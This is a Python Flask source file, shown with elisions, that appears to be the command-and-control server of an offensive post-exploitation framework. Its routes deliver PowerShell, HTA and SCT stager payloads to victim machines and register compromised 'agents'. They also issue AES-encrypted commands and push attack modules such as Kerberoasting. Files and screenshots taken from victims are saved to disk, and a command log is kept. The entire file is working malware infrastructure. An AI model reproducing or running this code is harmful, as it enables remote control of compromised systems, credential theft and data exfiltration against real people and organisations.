...
def payload():
    ...
    p_out = f'[+] Powershell PAYLOAD Send ({ip})'
...
def stager():
    ip = request.remote_addr
    p_out = f'[+] STAGER PAYLOAD Send ({ip})'
    print (bcolors.OKGREEN + p_out + bcolors.ENDC)
    return STAGER()
...
def stager52():
    ...
    if SSL==True:
        return (
            stager.replace('{ip}', HOST)
            .replace('{port}', PORT)
            .replace('{raw}', raw_payload)
            .replace('{b52payload}', b52_payload)
            .replace('{b52payload}', b52_payload)
            .replace('{HTTP}', "https")
        )
...
def base64():
    ip = request.remote_addr
    p_out = f'[+] BASE64 Powershell PAYLOAD Send ({ip})'
    print (bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def payloadc():
    ip = request.remote_addr
    p_out = f'[+] Powershell Encoded PAYLOAD Send ({ip})'
    print (bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def payloadjf():
    ip = request.remote_addr
    p_out = f'[+] Powershell JOB + File PAYLOAD Send ({ip})'
    print (bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def payloadjfs():
    print ("in")
    ip = request.remote_addr
    p_out = f'[+] Powershell JOB + File +SCT PAYLOAD Send ({ip})'
    print(bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def info():
    ...
    if AGENTS.get(id) is None and data != None:
        data = data.split('**')
        ip = request.remote_addr
        data.insert(0, ip)
        data.insert(0, COUNT)
...
def mshta():
    ip = request.remote_addr
    p_out = f'[+] New Agent Request HTA PAYLOAD ({ip})'
    print (bcolors.OKGREEN + p_out + bcolors.ENDC)
    ...
    with open('payloads/mshta.js', 'w') as payload:
...
def sct(request):
    ip = request.remote_addr
    p_out = f'[+] New Agent Request SCT PAYLOAD ({ip})'
    print (bcolors.OKGREEN + p_out + bcolors.ENDC)
...
def download():
    ...
    if AGENTS.get(id) != None and data != None:
        ...
        with open(f'downloads/{filename}', 'wb') as fp:
...
def image():
    ...
    #id= request.form['resource']
    #data = request.form['data']
    fn = id + ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
    if AGENTS.get(id) != None and data != None:
        data = decrypt_file(AESKey,data.strip().replace(" ","+").split(":")[1].split(":")[0])
        with open(f'images/{fn}.png', 'wb') as fp:
            fp.write(data)
...
def command():
    ...
    if AGENTS.get(id) != None and len(COMMAND.get(id)) > 0:
        ...
        out = f'{bcolors.OKGREEN}[~] {id}:{decrypt(AESKey, cmd)}{bcolors.ENDC}'
        print (out)
        with open("c2-logs.txt","a") as history:
            history.write(f'[~] {id}:{decrypt(AESKey, cmd)}' + "\n")
        return cmd
    elif AGENTS.get(id) is None:
        print(f'{bcolors.OKGREEN}[~] {id}:Register{bcolors.ENDC}')
        return 'REGISTER'
    else:
        seed(datetime.now())
        ...
        return (
            "".join(
                [random.choice(string.ascii_uppercase) for _ in range(rand1)]
            )
            + "-*-*-*"
            + "".join(
                [random.choice(string.ascii_uppercase) for _ in range(rand2)]
            )
        )
...
def result():
    ...
    if request.form[args[1]].find("img.jpeg")>-1:
        ...
        data =request.form[args[1]]
        id=request.form[args[0]]
    if AGENTS.get(id) is None or data is None:
        return 'REGISTER'
    ...
    if data.decode("UTF-8").find("Defense_Ananylsis_Module")>-1:
        ...
        fname = f"DA/{AGENTS[id][7]}@{AGENTS[id][6]}DA_out.txt"
        with open(fname,"w") as da:
    ...
    if data.decode("UTF-8").find("Kerberoast-Module")>-1:
        ...
        fname = f"kerberoast/{AGENTS[id][7]}@{AGENTS[id][6]}_kerb_out.txt"
...
def modules():
    ...
    if AGENTS.get(id) != None and data != None:
        ...
        p_out = f'[+] New Agent Request Module {data} ({AGENTS[id][0]} - {AGENTS[id][7]})'
        ...
        b64=0
        try:
            fpm = open(f'Modules/{data}', 'r')
            module = fpm.read()
            if b64=="1":
                module=base64mod.b64encode(module)
                #print module
            return encrypt(AESKey,module)
        except Exception as e:
            print (e)
            return ''
    return 'OK'
